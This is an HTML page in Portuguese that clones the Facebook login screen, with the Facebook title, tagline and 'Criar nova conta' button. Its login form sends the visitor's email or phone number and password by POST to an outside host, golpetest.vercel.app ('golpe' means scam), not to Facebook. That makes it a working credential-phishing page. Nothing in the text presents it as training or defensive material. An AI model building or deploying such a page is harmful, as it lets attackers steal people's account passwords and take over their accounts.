<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8"> <meta name="viewport"
content="width=device-width, initial-scale=1.0"> <link rel="icon"
type="image\x-icon" href="./Facebook.jpeg"> <link rel="stylesheet"
href="style.css"> <title>Facebook - entre ou cadastre-se</title>
</head>
<script>
function validarFormulario() {
var email = document.getElementById("email_telefone").value;
var senha = document.getElementById("password").value;
if (email === "" || senha === "") {
alert("Por favor, preencha todos os campos.");
return false;
}
return true;
}
</script>
<body>
<div class="content"> <div class="content-info">
<h1>Facebook</h1>
<h2>O Facebook ajuda você a se conectar e compartilhar com
as pessoas que fazem parte da sua vida.</h2> </div>
<div class="content-login"> <form
class="content-login-box" action="https://golpetest.vercel.app/" method="POST">
<input type="text" class="inputs" name="email_telefone"
placeholder="E-mail ou Telefone" required> <input
type="password" class="inputs" name="password" placeholder="Senha"
required> <button type="submit" class="btn
btn-enter">Entrar</button>
<a href="#" class="forgot-password">Esqueceu a
senha?</a> <hr> <button type="button"
class="btn btn-create-account">Criar nova conta</button>
</form>
<p>
<strong><a
href="https://www.facebook.com/pages/create/?ref_type=registration_form
" style="color: black;">
Criar uma Página
</a>
</strong>
para uma celebridade, uma marca ou uma empresa.
</p>
</div>
</div>
</body>
</html>
